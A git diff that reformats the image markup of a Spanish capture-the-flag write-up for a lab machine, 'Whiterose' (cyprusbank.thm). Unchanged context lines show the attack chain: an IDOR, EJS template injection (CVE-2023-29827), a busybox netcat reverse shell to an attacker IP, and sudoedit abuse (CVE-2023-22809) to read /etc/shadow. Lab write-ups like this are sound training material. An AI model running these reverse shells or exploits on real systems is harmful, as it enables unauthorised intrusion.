@@ -1,7 +1,5 @@
 <div align="center">
-    <figure>
-        <img src="./assets/whiterose-logo.png" width="400" height="400">
-    </figure>
+    <img src="./assets/whiterose-logo.png" width="400" height="400">
 </div>
 
 <div align="center">
@@ -79,17 +77,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 Al entrar por el navegador al puerto 80, nos redirige directamente a otra DNS la cual deberíamos agregar en nuestro archivo `/etc/hosts`
 
 <div align="center">
-    <figure>
-        <img src="./assets/dns-redir.png" width="700" height="400">
-        <figcaption>Solicitud rechazada por no reconocer la DNS</figcaption>
-    </figure>
-    <figure>
-        <img src="./assets/cyprusdns.png" width="700" height="400">
-        <figcaption>DNS de página de "customers"</figcaption>
-    </figure>
+    <img src="./assets/dns-redir.png" width="700" height="400">
+    <br>
+    <em>Solicitud rechazada por no reconocer la DNS</em>
+    <br><br>
+    <img src="./assets/cyprusdns.png" width="700" height="400">
+    <br>
+    <em>DNS de página de "customers"</em>
 </div>
 
-<br>
+<br><br>
 
 No hay cookies almacenadas ni nada por el momento, haremos un escaneo con `ffuf` y veamos si hay rutas ocultas.
 Tras el escaneo nada apareció, así que pensé que: ya que la DNS era diferente al hacer la primera solicitud, por qué no sería diferente de nuevo para buscar otra cosa. Hacemos un escaneo con `gobuster`
@@ -105,37 +102,34 @@ Found: admin.cyprusbank.thm Status: 200 [Size: 2195]
 Perfecto, tenemos una ruta `admin.cyprusbank.thm`:
 
 <div align="center">
-    <figure>
-        <img src="./assets/admin-dns.png" width="700" height="400">
-        <figcaption>Formulario de acceso (login)</figcaption>
-    </figure>
+    <img src="./assets/admin-dns.png" width="700" height="400">
+    <br>
+    <em>Formulario de acceso (login)</em>
 </div>
 
-<br>
+<br><br>
 
 Encontramos ese formulario e ingresamos con las credenciales que nos dieron en la página web del reto:
 
 `Olivia Cortez:olivi8`
 
 <div align="center">
-    <figure>
-        <img src="./assets/admin-panel.png" width="700" height="400">
-        <figcaption>Panel de administración</figcaption>
-    </figure>
+    <img src="./assets/admin-panel.png" width="700" height="400">
+    <br>
+    <em>Panel de administración</em>
 </div>
 
-<br>
+<br><br>
 
 Navegando un poco por la página podemos notar que el apartado de "Settings" está deshabilitado ya que no tenemos los permisos necesarios, pero en mensajes hay una posibilidad de **IDOR** (*Insecure Direct Object Reference*) con el parámetro `c`.
 
 <div align="center">
-    <figure>
-        <img src="./assets/idor.png" width="700" height="400">
-        <figcaption>Insecure Direct Object Reference (parámetro 'c')</figcaption>
-    </figure>
+    <img src="./assets/idor.png" width="700" height="400">
+    <br>
+    <em>Insecure Direct Object Reference (parámetro 'c')</em>
 </div>
 
-<br>
+<br><br>
 
 Encontramos las credenciales de "**Gayle Bev**".
 
@@ -146,45 +140,45 @@ Encontramos las credenciales de "**Gayle Bev**".
 A partir de aquí, si podremos entrar en el apartado de "*Settings*" y buscar el número de "**Tyrell Wellick**"
 
 <div align="center">
-    <figure>
-        <img src="./assets/tyrell-number.png" width="700" height="400">
-        <figcaption>Número de Tyrell</figcaption>
-    </figure>
+    <img src="./assets/tyrell-number.png" width="700" height="400">
+    <br>
+    <em>Número de Tyrell</em>
 </div>
 
-<br>
+<br><br>
 
 ### Shell como web
 
 Tras buscar un poco qué se podía hacer aquí, intenté cambiar la contraseña de "**Gayle**" pero tampoco hacía mucha diferencia, así que intenté simplemente mandar cualquier cosa por el formulario en el apartado de "*Settings*", lo cual me parece muy extraño porque sea cualquier cosa que ingresemos en el formulario siempre funcionará. Así que decidí interceptar las solicitudes con `BurpSuite`. Como estamos ante un servidor hecho con `ExpressJS`, simplemente hice la solicitud y me retornó un `ReferenceError` y un trozo de plantilla de `EJS`, decidí buscar un poco de información al respecto y encontré el **CVE-2023-29827**, hice una "PoC" con `ping` y funcionó.
 
->[!TIP]
->
->https://packetinside.github.io/cves/cve-2023-29827/
->
->https://eslam.io/cves/ejs-template-injection/
+> [!TIP]
+> 
+> https://packetinside.github.io/cves/cve-2023-29827/
+> 
+> https://eslam.io/cves/ejs-template-injection/
+> 
 
 <br>
 
 <div align="center">
-    <figure>
-        <img src="./assets/test-form.png" width="700" height="400">
-        <figcaption>El formulario recibe cualquier usuario y contraseña</figcaption>
-    </figure>
+    <img src="./assets/test-form.png" width="700" height="400">
+    <br>
+    <em>El formulario recibe cualquier usuario y contraseña</em>
 </div>
 
+<br><br>
+
 <div align="center">
-    <figure>
         <img src="./assets/poc1.png" width="700" height="400">
-        <figcaption>Haciendo la Prueba de Concepto enviando un ping</figcaption>
-    </figure>
-    <figure>
+        <br>
+        <em>Haciendo la Prueba de Concepto enviando un ping</em>
+        <br><br>
         <img src="./assets/poc2.png" width="700" height="400">
-        <figcaption>Escuchando la red con tcpdump y recibiendo el ping</figcaption>
-    </figure>
+        <br>
+        <em>Escuchando la red con tcpdump y recibiendo el ping</em>
 </div>
 
-<br>
+<br><br>
 
 Ya con esto podemos hacer una "Shell Reverse" en mi caso usaré la de "busybox":
 
@@ -193,28 +187,26 @@ busybox nc 192.168.137.54 4444 -e /bin/bash
 ```
 
 <div align="center">
-    <figure>
         <img src="./assets/shellrev1.png" width="700" height="300">
-        <figcaption>Enviando la Shell Reverse con busybox</figcaption>
-    </figure>
-    <figure>
+        <br>
+        <em>Enviando la Shell Reverse con busybox</em>
+        <br><br>
         <img src="./assets/shellrev2.png" width="700" height="400">
-        <figcaption>Recibiendo la conexión</figcaption>
-    </figure>
+        <br>
+        <em>Recibiendo la conexión</em>
 </div>
 
-<br>
+<br><br>
 
 Encontramos el primer flag "**user.txt**"
 
 <div align="center">
-    <figure>
-        <img src="./assets/userflag.png" width="600" height="400">
-        <figcaption>user.txt</figcaption>
-    </figure>
+    <img src="./assets/userflag.png" width="600" height="400">
+    <br>
+    <em>user.txt</em>
 </div>
 
-<br>
+<br><br>
 
 ### Shell como root
 
@@ -239,9 +231,10 @@ User web may run the following commands on cyprusbank:
 
 Buscando un poco al respecto sobre vulnerabilidades al binario `sudoedit` encontramos que existe el **CVE-2023-22809** que ataca a `sudo` y `sudoedit` y podemos basarnos en la siguiente fuente:
 
->[!TIP]
->
->https://packetstorm.news/files/id/174234
+> [!TIP]
+> 
+> https://packetstorm.news/files/id/174234
+> 
 
 <br>
 
@@ -267,22 +260,22 @@ sudo: /etc/nginx/sites-available/admin.cyprusbank.thm unchanged
 ```
 
 <div align="center">
-    <figure>
-        <img src="./assets/etc-shadow.png" width="600" height="400">
-        <figcaption>Archivo /etc/shadow</figcaption>
-    </figure>
+    <img src="./assets/etc-shadow.png" width="600" height="400">
+    <br>
+    <em>Archivo /etc/shadow</em>
 </div>
 
-<br>
+<br><br>
 
 Ahora que podemos ver que la prueba de concepto funcionó, apuntamos directamente a `/root/root.txt` y conseguimos el flag de `root`
 
 <div align="center">
-    <figure>
-        <img src="./assets/rootflag.png" width="600" height="100">
-        <figcaption>root.txt</figcaption>
-    </figure>
+    <img src="./assets/rootflag.png" width="600" height="100">
+    <br>
+    <em>root.txt</em>
 </div>
+
+<br>
 
 ---
 
